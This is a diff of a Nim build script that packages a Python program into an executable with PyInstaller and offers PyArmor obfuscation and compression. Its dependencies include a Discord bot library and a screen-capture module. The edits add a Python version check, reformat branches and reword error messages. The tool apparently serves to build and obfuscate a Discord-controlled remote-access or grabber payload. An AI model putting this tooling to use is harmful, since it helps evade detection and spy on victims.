@@ -78,12 +78,23 @@ proc compiler(): int =
     var obfuscate: bool
     var compress: bool
     var icon: bool = false
-        
+
+    # Check Python version, pyarmor no longer supports 3.11+
+    var status = execProcess("python --version")
+    for i in ["3.11", "3.12", "3.13", "3.14"]:
+        if i in status: 
+            echo "Python ", i, " is not supported!\nUninstall and run the compiler again to auto-download the correct version!"
+            sleep(5000)
+            quit(0)
+
     stdout.styledWriteLine({styleBright}, "Do you want to obfuscate the executable? (Y/n)")
     var input: char = getch()
-    if input == 'N' or input == 'n': obfuscate = false
-    elif input == 'Q' or input == 'q': return 0
-    else: obfuscate = true
+    if input == 'N' or input == 'n': 
+        obfuscate = false
+    elif input == 'Q' or input == 'q': 
+        return 0
+    else: 
+        obfuscate = true
     
     stdout.styledWriteLine({styleBright}, "Do you want to compress the executable? (Y/n)")
     input = getch()
@@ -153,7 +164,7 @@ proc compiler(): int =
                 return 0
         except OSError:
             # Modules not in path, try to find scripts directory
-            echo "Pyinstaller executable not found"
+            echo "PyInstaller executable not found"
             echo "Attempting to locate the executable in AppData....."
             var localappdata = getEnv("localappdata")
             for path in walkDirRec(localappdata):
@@ -168,9 +179,9 @@ proc compiler(): int =
                     pyinst = path
                     break
             if "undef" in pyinst:
-                echo "[FATAL] Pyinstaller executable not found."
-                echo "Please check your environment variables and python installation"
-                echo "before continuing..... Exiting in 5 seconds"
+                echo "[FATAL] Pyinstaller executable not found!"
+                echo "Have you put Scripts directory in PATH?"
+                echo "\nExiting in 5 seconds....."
                 sleep(5000)
                 return 0
                 
@@ -179,7 +190,8 @@ proc compiler(): int =
         try: 
             var whereArmor = splitLines(execCmdEx("where pyarmor-7").output)
             for pyarmor in whereArmor:
-                if pyarmor == "": continue
+                if pyarmor == "": 
+                    continue
                 var code = execCmdEx(pyarmor).exitCode
                 if code == 2:
                     armor = pyarmor
@@ -187,14 +199,14 @@ proc compiler(): int =
             if "undef" notin armor:
                 echo "Found! ", armor
             else:
-                echo "[FATAL] Pyarmor executable not found."
-                echo "Please check your environment variables and python installation"
-                echo "before continuing..... Exiting in 5 seconds"
+                echo "[FATAL] PyArmor executable not found!"
+                echo "Have you put Scripts directory in PATH?"
+                echo "\nExiting in 5 seconds....."
                 sleep(5000)
                 return 0
         except OSError:
             # Modules not in path, try to find scripts directory
-            echo "Pyarmor executable not found"
+            echo "PyArmor executable not found"
             echo "Attempting to locate the executable in AppData....."
             var localappdata = getEnv("localappdata")
             for path in walkDirRec(localappdata):
@@ -364,7 +376,7 @@ proc variablesCreator(x: int) =
         if compiler() == 0:
             return
 
-const pipModules = ["pyinstaller==4.10", "virtualenv", "disnake", "requests", "pyarmor", "mss"]
+const pipModules = ["pyinstaller", "virtualenv", "disnake", "requests", "pyarmor", "mss"]
          
 proc packageInstaller() = 
     printName()
@@ -398,14 +410,14 @@ proc packageInstaller() =
                 variablesCreator(0)
             else:
                 stdout.styledWriteLine({styleBright}, "[3] Installing/Updating dependencies...")
-                var res = execShellCmd("pip install pyinstaller==4.10 virtualenv aiohttp disnake requests mss pyarmor")
+                var res = execShellCmd("pip install pyinstaller virtualenv aiohttp disnake requests mss pyarmor")
                 if res == 0:
                     echo "========================"
                     stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
                     sleep(2000)
                     variablesCreator(0)
                 else:
-                    var res = execShellCmd("py -m pip install pyinstaller==4.10 virtualenv aiohttp disnake requests mss pyarmor")
+                    var res = execShellCmd("py -m pip install pyinstaller virtualenv aiohttp disnake requests mss pyarmor")
                     if res == 0:
                         echo "========================"
                         stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
